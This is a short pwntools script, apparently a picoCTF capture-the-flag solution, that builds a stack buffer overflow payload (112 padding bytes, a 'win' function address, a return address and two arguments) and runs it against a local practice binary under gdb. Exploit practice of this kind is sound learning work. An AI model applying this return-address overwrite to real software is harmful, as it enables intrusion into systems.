#!/bin/python3

import pwn
import re

elf = pwn.elf.ELF('./vulns/vuln')

winAddrEndian = pwn.pack(elf.symbols['win'], endianness='little')
returnAddr = pwn.pack(elf.symbols['main'], endianness='little')

offset = 112

payload = b'A'*offset + winAddrEndian + returnAddr \
    + pwn.p32(0xCAFEF00D) + pwn.p32(0xF00DF00D)


with open('./payload', 'wb') as filp:
    filp.write(payload)


p = pwn.process('./vulns/vuln')


pwn.gdb.attach(p, gdbscript=f'''
    b main
    r < payload
''')

# print(p.recvline())
# p.sendline(payload)

# flag = re.findall('picoCTF{.*}', str(p.recv()))[0]
# print(flag)
p.interactive()
